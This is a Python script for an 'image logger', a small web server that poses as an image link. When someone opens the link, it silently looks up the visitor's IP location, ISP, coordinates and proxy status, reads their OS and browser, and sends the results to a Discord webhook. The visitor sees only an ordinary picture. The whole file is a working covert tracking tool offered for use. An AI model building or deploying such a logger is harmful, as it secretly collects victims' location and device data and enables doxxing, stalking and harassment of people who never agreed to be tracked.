from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import requests
import httpagentparser

config = {
    "webhook": "YOUR_DISCORD_WEBHOOK",
    "image": "https://digitalcommunications.wp.st-andrews.ac.uk/files/2019/04/JPEG_compression_Example.jpg",
    "loading_image": "https://via.placeholder.com/600x400?text=Loading...",  # blank/loading image
    "username": "Image Logger",
    "color": 0x00FFFF,
    "redirect": True,
}

def makeReport(ip, useragent=None):
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    os, browser = httpagentparser.simple_detect(useragent)
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - IP Captured",
            "color": config["color"],
            "description": f"""
**IP Info**
> IP: {info.get('query','Unknown')}
> ISP: {info.get('isp','Unknown')}
> ASN: {info.get('as','Unknown')}
> Country: {info.get('country','Unknown')}
> Region: {info.get('regionName','Unknown')}
> City: {info.get('city','Unknown')}
> Coords: {info.get('lat','Unknown')}, {info.get('lon','Unknown')}
> VPN/Proxy: {info.get('proxy','Unknown')}

**PC Info**
> OS: {os}
> Browser: {browser}

**User Agent**
{useragent}
"""
        }]
    })

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = parse.urlparse(self.path)
        query = parse.parse_qs(parsed_path.query)
        client_ip = self.client_address[0]
        useragent = self.headers.get('User-Agent')

        # Capture info only when the link is clicked
        makeReport(client_ip, useragent)

        # Serve a page showing the actual image
        image = config['image']
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(f"""
<html>
<head><title>Image</title></head>
<body>
<img src="{image}" style="width:100%;height:auto;">
</body>
</html>
""".encode())

def run(server_class=HTTPServer, handler_class=Handler, port=8080):
    httpd = server_class(('', port), handler_class)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
